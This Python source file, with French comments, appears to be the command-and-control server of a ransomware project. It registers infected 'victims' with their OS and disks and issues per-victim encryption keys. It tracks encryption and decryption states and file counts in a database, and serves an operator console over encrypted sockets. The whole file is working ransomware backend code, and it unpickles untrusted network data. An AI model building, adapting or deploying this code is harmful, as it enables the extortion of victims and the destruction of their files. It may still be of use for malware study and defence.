import utile.network as network
import utile.message as message
import utile.data as data
import utile.security as security
import datetime
import threading
import queue
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import pickle

DEBUG_CONSOLE=True
DEBUG_SERVEUR=True

db_conn=data.connect_db() #Connexion à la DB

#Queues pour les communications entre le thread de la console et du master thread
queue_console_requetes=queue.Queue()
queue_console_reponses=queue.Queue()

#Queues pour les communications entre le thread du serveur frontal et du master thread
queue_serveur_requetes=queue.Queue()
queue_serveur_reponses=queue.Queue()


def console_controle():
    s_serv=network.start_srv()
    while True:
        if DEBUG_CONSOLE:
            print("En attente d'une connexion...\n",end="")
        conn, (ip, port) =s_serv.accept() #Attente d'une connexion

        # Hellman (clé)
        cle_chiffrement = security.hellman_serveur(conn) #La clé commune de chiffrement

        if DEBUG_CONSOLE:
            print(f"Console de controle connectée ! (IP: {ip}, PORT: {port})\n")

        while True:
            msg=network.receiv_msg(conn) #Attente d'un message
            if msg:
                msg=security.decrypt(msg, cle_chiffrement)
                msg=pickle.loads(msg)
                if DEBUG_CONSOLE:
                    print(f"Message reçu : {msg}")
                queue_console_requetes.put(msg) #Envoi le message au master thread pour faire les requetes SQL
                if message.get_message_type(msg) == "LIST_REQ":
                    victims=queue_console_reponses.get(block=True) #Attend que le master thread envoi la réponse
                    for victim in victims:
                        msgg=message.set_msg("victim", [victim[0], victim[1], victim[2],
                                                                          victim[3],victim[4], victim[5]])
                        network.send_msg(conn, security.encrypt(pickle.dumps(msgg), cle_chiffrement))
                    msgg=message.set_msg("list_end")
                    network.send_msg(conn, security.encrypt(pickle.dumps(msgg), cle_chiffrement))
                elif message.get_message_type(msg) == "HIST_REQ":
                    historique=queue_console_reponses.get(block=True) #Attend que le master thread envoi la réponse
                    ID=msg["HIST_REQ"]
                    for hist in historique:
                        msgg=message.set_msg("hist_resp", [hist[0], hist[1], hist[2], hist[3]])
                        network.send_msg(conn, security.encrypt(pickle.dumps(msgg), cle_chiffrement))
                    msgg=message.set_msg("HIST_END", [ID])
                    network.send_msg(conn, security.encrypt(pickle.dumps(msgg), cle_chiffrement))
            else:
                break


def serveur_frontal():
    s_serv_frontal=network.start_srv(port=8381)

    while True:
        if DEBUG_SERVEUR:
            print("[SERVEUR FRONTAL] En attente d'une connexion...\n",end="")
        conn_frontal, (ip, port) =s_serv_frontal.accept() #Attente d'une connexion

        # Hellman (clé)
        cle_chiffrement_serv = security.hellman_serveur(conn_frontal)  # La clé commune de chiffrement

        if DEBUG_SERVEUR:
            print(f"Serveur frontal connecté ! (IP: {ip}, PORT: {port})\n")

        while True:
            msg=network.receiv_msg(conn_frontal) #Attente d'un message
            if msg:
                msg = security.decrypt(msg, cle_chiffrement_serv)
                msg = pickle.loads(msg)
                if DEBUG_SERVEUR:
                    print(f"[SERVEUR FRONTAL] Message reçu : {msg}")
                if message.get_message_type(msg) == "RESTART" or message.get_message_type(msg) == "INITIALIZE":
                    queue_serveur_requetes.put(msg) #Envoi le message au master thread pour traiter
                    response=queue_serveur_reponses.get(block=True)
                    network.send_msg(conn_frontal, security.encrypt(pickle.dumps(response), cle_chiffrement_serv))
                    if DEBUG_SERVEUR:
                        print(f"[SERVEUR FRONTAL] Message renvoyé : {response}")
                elif message.get_message_type(msg) == "CRYPT":
                    queue_serveur_requetes.put(msg)  # Envoi le message au master thread pour traiter
                elif message.get_message_type(msg) == "PENDING":
                    queue_serveur_requetes.put(msg)  # Envoi le message au master thread pour traiter
                    response = queue_serveur_reponses.get(block=True)
                    if response != "RIEN":
                        network.send_msg(conn_frontal, security.encrypt(pickle.dumps(response), cle_chiffrement_serv))
                        if DEBUG_SERVEUR:
                            print(f"[SERVEUR FRONTAL] Message renvoyé : {response}")
                    else:
                        network.send_msg(conn_frontal, security.encrypt(pickle.dumps(response), cle_chiffrement_serv))
                elif message.get_message_type(msg) == "PROTECTREQ":
                    queue_serveur_requetes.put(msg)  # Envoi le message au master thread pour traiter
                    response = queue_serveur_reponses.get(block=True)
                    network.send_msg(conn_frontal, security.encrypt(pickle.dumps(response), cle_chiffrement_serv))
                    if DEBUG_SERVEUR:
                        print(f"[SERVEUR FRONTAL] Message renvoyé : {response}")
            else:
                break


def gen_key():
    """
    Génère la clé de chiffrement en SHA512 pour les victimes
    :return: La clé
    """
    return hashlib.sha512(get_random_bytes(AES.block_size)).hexdigest()


#Thread pour la console
thread_console=threading.Thread(target=console_controle)
thread_console.start()

#Thread pour le serveur frontal
thread_serveur=threading.Thread(target=serveur_frontal)
thread_serveur.start()

while True:
    try:
        # Essaye de récupérer le message envoyé par le thread "thread_console" (si pas envoyé, on passe à la prochaine queue)
        msg=queue_console_requetes.get(block=False)
    except queue.Empty:
        pass
    else: #Transactions avec la BD (Message provenant de la console de controle) + envoi de la réponse au thread console
        if message.get_message_type(msg) == "LIST_REQ":
            victims = data.get_list_victims(db_conn)
            queue_console_reponses.put(victims)
            if DEBUG_CONSOLE:
                print(f"Liste des victimes envoyée.\n")
        elif message.get_message_type(msg) == "HIST_REQ":
            ID = msg["HIST_REQ"]
            historique = data.get_list_history(db_conn, ID)
            queue_console_reponses.put(historique)
            if DEBUG_CONSOLE:
                print(f"Historique envoyé.\n")
        elif message.get_message_type(msg) == "CHGSTATE":
            data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                             (msg["CHGSTATE"], int(datetime.datetime.now().timestamp()), msg["STATE"]))
            if DEBUG_CONSOLE:
                print(f"Etat changé dans la base de données.\n")
    try:
        pass
        # Essaye de récupérer le message envoyé par le thread "thread_serveur" (si pas envoyé, on passe)
        msg = queue_serveur_requetes.get(block=False)
    except queue.Empty:
        pass
    else:  # Traitement du message reçu du serv frontal
        if message.get_message_type(msg) == "INITIALIZE":

            # Verification si le HASH donné est déjà en BD
            already_saved=False
            victims=data.get_list_victims(db_conn)  # Reprends la liste des victimes
            for victim in victims:
                # Pour chaque victime, verification si le hash qui a été reçu n'est pas déjà en BD
                # msg["INITIALIZE"] contient le hash qui doit être comparé à tout les hash (victim[1])
                if victim[1]==msg["INITIALIZE"]:
                    saved_victim=victim
                    already_saved=True  # La victime en question est déjà en BD

            if not already_saved:
                cle_chiffrement_victime=gen_key()
                # Enregistrement de la victime en BD
                data.insert_data(db_conn, "victims", ("os", "hash", "disks","key"),
                                 (msg["OS"], msg["INITIALIZE"], msg["DISKS"], cle_chiffrement_victime))
                # Récupération de l'ID de cette nouvelle victime
                victim_id=data.get_last_id(db_conn)

                response=message.set_msg("KEY_RESP", [victim_id, cle_chiffrement_victime, "INITIALIZE"])

                # Enregistrement du state de la victime en BD (initialize)
                data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                                 (victim_id, int(datetime.datetime.now().timestamp()), "INITIALIZE"))
                queue_serveur_reponses.put(response)  # Envoie la réponse qui est attendue par le serveur frontal
            else:  # Procédure si jamais une victime est déjà sauvegardée --> Envoie de sa clé
                key=data.get_encryption_key(db_conn, saved_victim[1])
                response=message.set_msg("KEY_RESP", [saved_victim[0], key, saved_victim[4]])  # saved_victim[4] étant le STATE
                queue_serveur_reponses.put(response)  # Envoie la réponse qui est attendue par le serveur frontal
        elif message.get_message_type(msg) == "RESTART":
            key=data.get_encryption_key(db_conn, msg["RESTART"])
            response=message.set_msg("RESTART_RESP", [msg['RESTART'], key])
            queue_serveur_reponses.put(response)
        elif message.get_message_type(msg) == "CRYPT":
            data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                             (msg["CRYPT"], int(datetime.datetime.now().timestamp()), "CRYPT"))
        elif message.get_message_type(msg) == "PENDING":
            victims=data.get_list_victims(db_conn)
            # Retrouve la bonne victime
            for victim in victims:
                if victim[0] == msg["PENDING"]:
                    victime=victim
                    break
            timestamp=int(datetime.datetime.now().timestamp())
            if victime[4] in ("CRYPT", "INITIALIZE"):
                data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                                 (victime[0], timestamp, "PENDING"))
                data.insert_data(db_conn, "encrypted", ("id_victim", "datetime", "nb_files"),
                                 (victime[0], timestamp, msg["NB_FILE"]))
                queue_serveur_reponses.put("RIEN")  # Renvoie un message contenant "RIEN" pour débloquer le serveur frontal (celui-ci ne fera rien du message)
            elif victime[4] == "PENDING":
                if msg["NB_FILE"]!=victime[5]:
                    data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                                     (victime[0], timestamp, "PENDING"))
                    data.insert_data(db_conn, "encrypted", ("id_victim", "datetime", "nb_files"),
                                     (victime[0], timestamp, msg["NB_FILE"]))
                queue_serveur_reponses.put("RIEN")  # Renvoie un message contenant "RIEN" pour débloquer le serveur frontal (celui-ci ne fera rien du message)
            elif victime[4] == "DECRYPT":  # Demande de dechiffrement de tout les fichiers de la victime
                response = message.set_msg("DECRYPT", [victime[0], data.get_crypted_files(db_conn, victime[0])])
                queue_serveur_reponses.put(response)
        elif message.get_message_type(msg) == "PROTECTREQ":
            timestamp = int(datetime.datetime.now().timestamp())
            data.insert_data(db_conn, "states", ("id_victim", "datetime", "state"),
                             (msg["PROTECTREQ"], timestamp, "PROTECTED"))
            data.insert_data(db_conn, "decrypted", ("id_victim", "datetime", "nb_files"),
                             (msg["PROTECTREQ"], timestamp, msg["NB_FILE"]))
            crypted_files=data.get_crypted_files(db_conn, msg["PROTECTREQ"])
            response = message.set_msg("COUNT", [msg["PROTECTREQ"], crypted_files])
            queue_serveur_reponses.put(response)
